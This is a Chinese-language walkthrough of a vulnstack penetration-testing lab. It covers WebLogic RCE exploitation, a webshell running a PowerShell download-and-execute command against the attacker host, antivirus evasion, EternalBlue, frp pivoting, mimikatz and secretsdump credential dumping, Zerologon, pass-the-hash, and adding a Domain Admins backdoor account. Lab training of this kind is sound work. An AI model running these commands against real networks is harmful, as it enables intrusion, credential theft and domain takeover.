# 前言

在我之前的文章[vulnstack(一)打靶](https://blog.csdn.net/xf555er/article/details/127384012)，我主要依赖Cobalt Strike进行后期渗透测试，这次我计划使用Metasploit框架(MSF)来进行这个阶段的工作。这个靶场与之前的不同之处在于它的WEB服务器安装了360安全卫士。虽然这增加了挑战的难度，但只要我们能够成功地进行免杀处理，就可以顺利进行渗透



# 靶场考察知识

## 1.weblogic漏洞

Oracle WebLogic是一个基于Java EE的应用服务器，是Oracle的云应用基础架构的关键组成部分。它支持创建、部署和运行分布式多层Java EE应用程序。

尽管WebLogic是一个强大而受欢迎的应用服务器，但它也有一些重要的安全漏洞

- **CVE-2017-3506**：这是一个在WebLogic服务器中发现的远程代码执行（RCE）漏洞。它影响了WebLogic的WLS Security组件（针对WebLogic Server 10.3.6.0和12.1.3.0版本）。攻击者可以通过网络利用这个漏洞，无需用户交互或用户认证。如果成功，攻击者可以在WebLogic服务器主机上完全接管控制权。
- **CVE-2019-2725**：这也是一个远程代码执行（RCE）漏洞，影响WebLogic服务器中的某个可反序列化组件。该漏洞在WebLogic服务器10.3.6.0和12.1.3.0版本中存在。成功利用该漏洞的攻击者可以通过网络，无需有效用户认证，控制受影响的系统。这个漏洞与CVE-2017-3506相似，但影响的组件和可利用的方式略有不同



## 2.CVE-2020-1472

CVE-2020-1472是一个严重的Windows安全漏洞，被微软命名为"Zerologon"。它存在于Windows服务器的Netlogon远程协议中，该协议被用于各种任务，包括用户和机器身份验证。这个漏洞由Dutch security firm Secura的研究人员发现。

Zerologon漏洞使攻击者能够在网络上的任何位置完全接管域控制器，并在没有用户交互的情况下执行此操作。一旦控制了域控制器，攻击者就可以执行各种恶意活动，例如添加新的域管理员账户，重置现有账户密码，执行代码等



# 靶场搭建

## 拓扑图

![img](vulnstack靶场系列二/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvODMyNjA0LzIwMjAxMC84MzI2MDQtMjAyMDEwMjgxMTE1Mjg3NzAtMjYxNzQzNzkxLnBuZw==.png)



## 主机IP配置	

此靶场用户的统一密码均为：`1qaz@WSX` 。NAT网卡为外网IP，其网段为`192.168.47.0/24`；VMnet3为内网IP，其网段为`10.10.10.0/24`

| 虚拟机系统      | 网卡            | IP                               | 登录用户 |
| --------------- | --------------- | -------------------------------- | -------- |
| kali（攻击机）  | NAT             | 192.168.47.155                   |          |
| WEB（域内主机） | NAT<br />VMnet3 | 192.168.47.129<br />10.10.10.80  | mssql    |
| DC（域控主机）  | VMnet3          | 10.10.10.10                      | de1ay    |
| PC（域内主机）  | NAT<br />VMnet3 | 192.168.47.160<br />10.10.10.201 | mssql    |



## WEB主机配置

首先将WEB主机的快照至恢复至v1.3

![image-20230425201003236](vulnstack靶场系列二/image-20230425201003236.png)



输入`.\de1ay`表示登录本地的de1ay用户而非域用户

![image-20230425202559121](vulnstack靶场系列二/image-20230425202559121.png)



随后要求你重置密码，点击确定

![image-20230425202641813](vulnstack靶场系列二/image-20230425202641813.png)	

​	

此处我将密码重置为`qQ123456`，要注意的是，de1ay用户是本地管理员

![image-20230425202702994](vulnstack靶场系列二/image-20230425202702994.png)	



注销本地的de1ay用户，随后切换至de1ay域的mssql用户，这样做的是目的是提升难度，而不会一拿到的shell就是管理员权限	

<img src="vulnstack靶场系列二/image-20230425203258219.png" alt="image-20230425203258219" style="zoom:67%;" />				



以管理员权限运行:`C:\Oracle\Middleware\user_projects\domains\base_domain\bin\strartWebLogic.cmd`

![image-20230425210814996](vulnstack靶场系列二/image-20230425210814996.png)	



打开物理机访问`192.168.47.129:7001`，测试WEB机的Weblogic服务是否运行成功，若出现以下界面则表示运行成功

![image-20230425213343109](vulnstack靶场系列二/image-20230425213343109.png)



## PC主机配置

同理, PC机也更改一下本地的de1ay用户的密码

![image-20230425215909510](vulnstack靶场系列二/image-20230425215909510.png)	

登录PC机后出现弹框，提示360运行需要管理员用户的权限

![image-20230425203622494](vulnstack靶场系列二/image-20230425203622494.png)	



# Web渗透

## 信息收集

### 1.namp扫描

使用nmap扫描存活主机：`nmap -sn 192.168.47.0/24`，发现两台主机，分别是`192.168.47.129`和`192.168.47.160`

![image-20230427222637596](vulnstack靶场系列二/image-20230427222637596.png)	



扫描第一个主机的开放端口：`nmap -p- 192.168.47.129`，http服务的80端口，mssql的1433端口，远程登录服务的3389端口，以及weblogic的7001端口，猜测这台机器很可能是web服务器

![image-20230427223120393](vulnstack靶场系列二/image-20230427223120393.png)	



扫描另外一个主机：`nmap -p- 192.168.47.160`，这台机器应该是员工区的PC机

![image-20230427223819087](vulnstack靶场系列二/image-20230427223819087.png)	



扫描指定端口的常见漏洞：`nmap --script=vuln -p 80,135,139,445,1688,3389,7001 192.168.47.129`，发现永恒之蓝ms17-010漏洞

![image-20230427231454638](vulnstack靶场系列二/image-20230427231454638.png)



`nmap --script=vuln -p 135,139,445,3389 192.168.47.160`, pc机也发现了永恒之蓝漏洞

![image-20230427224712874](vulnstack靶场系列二/image-20230427224712874.png)



### 2.dirsearch目录爆破

对web主机进行目录爆破，先爆80端口： `python3 dirsearch.py -u http://192.168.47.129 -e* -x 403,404`，没有可用信息

![image-20230428120338028](vulnstack靶场系列二/image-20230428120338028.png)



继续爆weblogic服务的7001端口：`python3 dirsearch.py -u http://192.168.47.129:7001 -e* -x 403,404`

![image-20230428125935638](vulnstack靶场系列二/image-20230428125935638.png)



访问控制台登录页面：`/console/login/LoginForm.jsp`，爆出敏感信息：weblogic的版本号为10.3.3.0

![image-20230428130139833](vulnstack靶场系列二/image-20230428130139833.png)



### 3.weblogic漏洞扫描

使用weblogic漏扫工具扫描：`python3 WeblogicScan.py -u 192.168.47.129 -p 7001`，爆出`CVE-2017-3506`以及`CVE-2019-2725`，均为远程代码执行漏洞

![image-20230428132119263](vulnstack靶场系列二/image-20230428132119263.png)



## 漏洞利用

### 1.ms07010漏洞利用

尝试使用MSF的ms17010远程命令执行EXP，但是失败了，估计是被360拦截掉了

![image-20230427231823163](vulnstack靶场系列二/image-20230427231823163.png)



换另外一个EXP，尝试返回目标主机的meterpreter会话：`use exploit/windows/smb/ms17_010_eternalblue`	，但还是失败了，在web机可以看到是被360拦截了

![image-20230427232137536](vulnstack靶场系列二/image-20230427232137536.png)

<img src="vulnstack靶场系列二/image-20230427234627163.png" alt="image-20230427234627163" style="zoom:67%;" />	



### 2.weblogic漏洞利用

msf搜索与weblogic相关的漏洞，根据之前漏扫爆出来的漏洞编号选择对应的年份(2017和2019)，此处选择2019的

<img src="vulnstack靶场系列二/image-20230429114246277.png" alt="image-20230429114246277" style="zoom:67%;" />

<img src="vulnstack靶场系列二/image-20230429115636186.png" alt="image-20230429115636186" style="zoom:67%;" />



这里需修改EXP的设置, 由于目标主机是windows，需将target设为1，其他设置如下图所示，成功返回一个meterpreter会话，也能够正常获取uid， 但是很快就被360干掉了

![image-20230429120030747](vulnstack靶场系列二/image-20230429120030747.png)

![image-20230429120143693](vulnstack靶场系列二/image-20230429120143693.png)	



使用cve-2017-3506的exp扫描漏洞是否存在：`java -jar .\WebLogic-XMLDecoder.jar -u http://192.168.47.129:7001`

![image-20230429131419649](vulnstack靶场系列二/image-20230429131419649.png)



使用cve-2017-3506的漏洞利用exp：`java -jar .\WebLogic-XMLDecoder.jar -s http://192.168.47.129:7001 /wls-wsat/CoordinatorPortType11 shell.jsp`

![image-20230429132144382](vulnstack靶场系列二/image-20230429132144382.png)



访问写进去的webshell(shell.jsp)执行任意命令，命令执行成功

![image-20230429132027418](vulnstack靶场系列二/image-20230429132027418.png)



尝试远程加载cs的powershell命令：`http://192.168.47.129:7001/wls-wsat/shell.jsp?password=secfree&command=powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.47.155:80/a'))"`， 但是执行失败了，cs没有上线

![image-20230429163717896](vulnstack靶场系列二/image-20230429163717896.png)



### 3.写入webshell

尝试一键写入webshell，利用`CVE-2020-2551`漏洞，漏洞利用成功 (此webshell默认密钥为key)

<img src="vulnstack靶场系列二/image-20230503164235507.png" alt="image-20230503164235507" style="zoom:67%;" />	



打开哥斯拉连接webshell

<img src="vulnstack靶场系列二/image-20230503164314189.png" alt="image-20230503164314189" style="zoom: 80%;" />			



进入webshell，测试执行远程命令

<img src="vulnstack靶场系列二/image-20230503164411020.png" alt="image-20230503164411020" style="zoom:67%;" />		



上传msf生成的木马，立马被360查杀掉了, 因此需对其做免杀处理, 此处我用到的免杀技术为[动态调用api函数加载shellcode](https://blog.csdn.net/xf555er/article/details/130855421)

![image-20230503171747538](vulnstack靶场系列二/image-20230503171747538.png)	

![image-20230503172820475](vulnstack靶场系列二/image-20230503172820475.png)	



上传免杀后的木马并执行, msf成功接收到meterpreter

![image-20230503202635439](vulnstack靶场系列二/image-20230503202635439.png)	

![image-20230503202408729](vulnstack靶场系列二/image-20230503202408729.png)



# 后渗透

## 内网信息收集

先将`fscan.exe`上传至目标主机

![image-20230503204547893](vulnstack靶场系列二/image-20230503204547893.png)



进入cmd shell命令执行：`ipconfig /all`，meterpreter执行命令`sysinfo`来获取目标系统的基本信息，此处获取到的信息整理如下：

- 主机名: WEB
- 当前域：de1ay
- 内网ip地址：10.10.10.80
- DNS服务器地址：10.10.10.10
- OS：Windows 2008 R2
- 系统架构：64位

<img src="vulnstack靶场系列二/image-20230503205213195.png" alt="image-20230503205213195" style="zoom:67%;" />	

<img src="vulnstack靶场系列二/image-20230503205712163.png" alt="image-20230503205712163" style="zoom:67%;" />	

<img src="vulnstack靶场系列二/image-20230529225519825.png" alt="image-20230529225519825" style="zoom:67%;" />	



## 内网漏洞扫描

使用fscan.exe扫描内网存活ip以及进行漏洞扫描：`fscan.exe -h 10.10.10.1/24`，发现内网的另一个IP是10.10.10.10，这个IP应该就是域控服务器的IP了，因为DNS服务器通常为域控服务器，而且这个域控服务器还存在永恒之蓝漏洞

<img src="vulnstack靶场系列二/image-20230503225730965.png" alt="image-20230503225730965" style="zoom:67%;" />	

<img src="vulnstack靶场系列二/image-20230503225716392.png" alt="image-20230503225716392" style="zoom:67%;" />



## 永恒之蓝打域控

开启路由转发：`run autoroute -s 10.10.10.0/24`，目标是让msf能够访问内网的其他主机

> 此命令使用autoroute脚本来添加一个静态路由，换句话说，这个命令将你当前的 Meterpreter 会话作为一个路由器，可以让你访问到该子网内的其他主机

![image-20230503231440843](vulnstack靶场系列二/image-20230503231440843.png)



尝试使用永恒之蓝exp对域控进行攻击，成功返回域控的meterpreter

![image-20230503231725683](vulnstack靶场系列二/image-20230503231725683.png)



## 永恒之蓝提权Web主机

使用MSF查找可能的提权漏洞，使用`post/multi/recon/local_exploit_suggester`模块，Metasploit会建议可能适用于该系统的本地提权漏洞，然后使用run命令执行此模块。

```
meterpreter > background
msf > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set SESSION [your session id]
msf post(multi/recon/local_exploit_suggester) > run
```



漏洞扫描被意外终止，具体原因我也不清楚

![image-20230530194243475](vulnstack靶场系列二/image-20230530194243475.png)	



由于Web主机的当前用户是普通用户，因此需对它进行提权操作，永恒之蓝漏洞可以达到提权的效果，尝试对Web主机的内网IP进行漏洞利用，失败告终

<img src="vulnstack靶场系列二/image-20230526225654259.png" alt="image-20230526225654259" style="zoom: 50%;" />	

<img src="vulnstack靶场系列二/image-20230526225718396.png" alt="image-20230526225718396" style="zoom: 50%;" />	

​	

使用frp内网穿透可以解决上述永恒之蓝漏洞利用失败的情况，首先设置frp服务端的配置文件`frps.ini`

```
[common]
bind_port = 7000  

[socks5]
type = tcp
auth_method = noauth  #表示这个代理不需要验证。如果你需要验证，可以设置为 userpass 并提供 username 和 password
bind_addr = 0.0.0.0
listen_port = 1080
```



kali执行命令启用frp服务端: `./frps -c ./frps.ini`

![image-20230529235913739](vulnstack靶场系列二/image-20230529235913739.png)



如下所示设置客户端的配置文件`frpc.ini` ，随后将`frpc.exe`和`frpc.ini`都上传至web机上

```
[common]
server_addr = 192.168.47.155
server_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5  ;用SOCKS5代理插件
```



 `setg proxies socks5:192.168.47.155:1080`：setg命令用于设置全局选项,也就是说后续的所有网络操作都将通过这个socks5代理进行

 `setg ReverseAllowProxy true`：将允许Metasploit的反向连接（reverse connections）通过代理,反向连接通常用于在成功利用某个漏洞后与目标系统建立连接，用于发送命令和接收结果

![image-20230527165347717](vulnstack靶场系列二/image-20230527165347717.png)



payload必须设置为`bind_tcp`, 设置`rhost`为web主机的内网ip

![image-20230527172530748](vulnstack靶场系列二/image-20230527172530748.png)	

​	

exp运行后成功返回当前Web主机的meterpreter会话

![image-20230527172823829](vulnstack靶场系列二/image-20230527172823829.png)	



## mimikatz凭据提取

`getuid`查看当前用户权限为`system`, 这就意味着可以使用mimikatz进行凭据提取了

![image-20230527172908844](vulnstack靶场系列二/image-20230527172908844.png)	



加载mimikatz：`load kiwi`

![image-20230527173155313](vulnstack靶场系列二/image-20230527173155313.png)



获取凭据：`creds_all`，这个命令将尝试提取存储在内存中的各种凭据

![image-20230527173303819](vulnstack靶场系列二/image-20230527173303819.png)

![image-20230527173717054](vulnstack靶场系列二/image-20230527173717054.png)



以下表格是上述获取到的凭据

| 域    | 账号和密码             |
| ----- | ---------------------- |
| DE1AY | Administrator/1qaz@WSX |
| DE1AY | mssql/1qaz@WS          |
| WEB   | de1ay/qQ123456         |



## `CVE-2020-1472`打域控

修改proxychains的配置文件：`vim etc/proxychains4.conf`， 添加上socks5代理，其目的是让其他应用程序能够访问目标内网

![image-20230527235349333](vulnstack靶场系列二/image-20230527235349333.png)	



使用`zerologon_tester.py`来测试域控是否存在`CVE-2020-1472`漏洞，结果显示漏洞存在

```
proxychains4 python3 zerologon_tester.py [域控主机名] [域控ip]
```

![image-20230527235651822](vulnstack靶场系列二/image-20230527235651822.png)	



使用`cve-2020-1472-exploit`将域控制器账户的密码设置为空

> 域控制器账户是一个特殊的系统账户，用于运行域控制器服务和进行与其他系统的通信。这个账户通常是不可见的，并且不能用来登录或执行常规的用户操作
>
> 而"Administrator"通常是域管理员账户的默认名称，它拥有可以管理整个域，包括所有用户、计算机和服务的权限
>
> 在许多情况下，域管理员账户（例如Administrator）有足够的权限来管理域控制器和其它网络资源。然而，正如CVE-2020-1472（Zerologon）漏洞所展示的，攻击者如果能够以某种方式获得域控制器账户的权限，他们可能会绕过正常的认证机制并直接控制域控制器
>
> 所以总的来说，域控制器账户并不等同于Administrator账户，虽然两者都具有高级权限

```
proxychains4 python3 cve-2020-1472-exploit.py [域控名称] [域控ip]
```

![image-20230528000136748](vulnstack靶场系列二/image-20230528000136748.png)



以下命令试图通过IP地址`10.10.10.10`访问`de1ay.com`域中的机器账户`dc$`，并且在这个过程中不需要密码，成功之后，它将尝试从目标服务器抓取并输出密码哈希值和其他凭据信息。此处将域管理员账户Administrator的哈希值复制下来。

```
proxychains impacket-secretsdump de1ay.com/dc\$@10.10.10.10 -no-pass
```

> `impacket-secretsdump`是Impacket库的一个工具，用于抓取Windows服务器的密码哈希值和其他凭据信息
>
> `-no-pass`：这是一个参数，表示我们在尝试访问目标服务器时不会提供密码。这个参数通常在已知存在某种漏洞（比如CVE-2020-1472）可以让我们在没有密码的情况下访问目标服务器时使用

![](vulnstack靶场系列二/image-20230528000336625.png)



以下命令利用`impacket-wmiexec`工具以及提供的NTLM哈希值，在IP地址为`10.10.10.10`的远程Windows服务器上以`administrator`用户的身份执行命令

```
proxychains impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 administrator@10.10.10.10
```

> `impacket-wmiexec`：这是Impacket库中的一个工具，它可以在远程Windows服务器上执行命令
>
> `-hashes`：这个选项允许你提供NTLM哈希值来进行身份验证，而不是使用密码，在这个命令中，你提供了一个LM哈希值（`aad3b435b51404eeaad3b435b51404ee`）和一个NTLM哈希值（`161cff084477fe596a5db81874498a24`）
>
> `./administrator@10.10.10.10`：这表示你希望以`administrator`用户的身份登录到IP地址为`10.10.10.10`的远程服务器

![image-20230528002213882](vulnstack靶场系列二/image-20230528002213882.png)



`reg save`命令将指定注册表键保存到指定文件，其目的是为了后续破解用户密码

- `reg save HKLM\SYSTEM system.save` ：`HKLM\SYSTEM` 键包含了关于操作系统配置的信息
- `reg save HKLM\SAM sam.save` ：`HKLM\SAM` 键包含了关于用户和用户组的信息
- `reg save HKLM\SECURITY security.save`：`HKLM\SECURITY` 键包含了关于系统安全设置的信息

<img src="vulnstack靶场系列二/image-20230528133032137.png" alt="image-20230528133032137" style="zoom:67%;" />	

<img src="vulnstack靶场系列二/image-20230528133144327.png" alt="image-20230528133144327" style="zoom:67%;" />	



使用`lget`命令从远程系统下载文件到本地系统，再使用`del`命令将这些文件从远程系统中删除

> `lget` 命令常用在一些远程管理和操作的环境中，例如交互式shell会话或者一些远程执行工具中，用于从远程系统下载文件到本地系统

![image-20230528133504199](vulnstack靶场系列二/image-20230528133504199.png)	



尝试添加新用户，但是失败了，猜测可能是密码的设置强度问题

![image-20230528143508278](vulnstack靶场系列二/image-20230528143508278.png)



参考之前获取到的域控账户的密码`1qaz@WSX`，此处我也将新用户的密码设置成和他一样的，添加成功了

```
net user Henry 1qaz@WSX /add /domain
```

![image-20230528143557222](vulnstack靶场系列二/image-20230528143557222.png)



添加用户至管理员组: `net group "Domain Admins" Henry /add /domain`

![image-20230528143715023](vulnstack靶场系列二/image-20230528143715023.png)



查询管理员组是否有刚添加的用户: `net group "Domain Admins"`

![image-20230528143747571](vulnstack靶场系列二/image-20230528143747571.png)

​	

查看本地目录，可以看到远程获取到的三个注册表文件

![image-20230528143818874](vulnstack靶场系列二/image-20230528143818874.png)



这条命令是使用 Impacket 库中的 `secretsdump.py` 工具来从本地 Windows 注册表文件中提取凭据，将哈希值复制下来用于后续恢复域控制器账户的密码

```
impacket-secretsdump -sam sam.save -system system.save -security security.save local
```

![image-20230528172110062](vulnstack靶场系列二/image-20230528172110062.png)



使用`reinstall_original_pw.py`，用于恢复域控制器账户的密码

```
proxychains python3 reinstall_original_pw.py dc 10.10.10.10 <hex值>
```

![image-20230528173245217](vulnstack靶场系列二/image-20230528173245217.png)



再次尝试抓取域控制器账户的密码，若提示登录失败，则表示域控账户恢复成功

![image-20230528173551705](vulnstack靶场系列二/image-20230528173551705.png)



## 登录域控主机

由于web主机开启了3389端口，使用`rdesktop`远程登录，账户密码就用mimikatz抓取到的`WEB\de1ay 1qaz@WSX`

![image-20230528174554293](vulnstack靶场系列二/image-20230528174554293.png)



在运行对话框中输入`mstsc`呼出远程桌面连接	

<img src="vulnstack靶场系列二/image-20230528175130645.png" alt="image-20230528175130645" style="zoom:67%;" />	



关闭域控机器的防火墙

<img src="vulnstack靶场系列二/image-20230528204551655.png" alt="image-20230528204551655" style="zoom:67%;" />	



查看域内主机都有哪些

<img src="vulnstack靶场系列二/image-20230528204716902.png" alt="image-20230528204716902" style="zoom:67%;" />	



通过ping主机名获取PC主机的内网IP

<img src="vulnstack靶场系列二/image-20230528204820397.png" alt="image-20230528204820397" style="zoom:67%;" />	



尝试使用管理员账户远程登录PC机, 登录成功

<img src="vulnstack靶场系列二/image-20230528205945619.png" alt="image-20230528205945619" style="zoom:67%;" />	



# 总结				

- 当针对内网主机使用MSF进行永恒之蓝漏洞攻击失败时，一个替代方案是首先利用frp实现内网穿透，然后再进行漏洞利用。这种方法可能会产生意想不到的效果。
- 我原本计划通过Meterpreter的portfwd命令将域控的3389端口映射到kali本地端口，随后使用rdesktop进行远程登录。然而，这一计划并未成功，我推测这可能是因为域控做了某些限制，只允许10.10.10.0/24网段的主机进行远程登录。
